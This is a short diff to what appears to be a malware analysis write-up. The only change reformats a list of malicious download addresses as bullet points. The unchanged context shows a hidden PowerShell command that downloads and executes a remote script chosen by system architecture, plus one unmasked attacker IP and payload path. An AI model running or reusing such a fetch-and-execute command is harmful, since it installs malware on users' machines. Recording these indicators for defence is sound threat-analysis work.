@@ -38,9 +38,9 @@ The malware is downloaded from different IP addresses by means of the script ide
 cmd /c powershell.exe -NoP -NonI -W Hidden "if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('http://IP /info6.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('http://IP/info3.ps1')}"
 ```
 malicious IP addresses:
-195.22.127.157:8000/INFO6.PS1
-118.XXX.48.95:8000/INFO6.PS1
-93.XXX.93.73:8000/INFO6.PS1
+  - 195.22.127.157:8000/INFO6.PS1
+  - 118.XXX.48.95:8000/INFO6.PS1
+  - 93.XXX.93.73:8000/INFO6.PS1
 
 #### The malware creates persistence stored in classes:
 ```
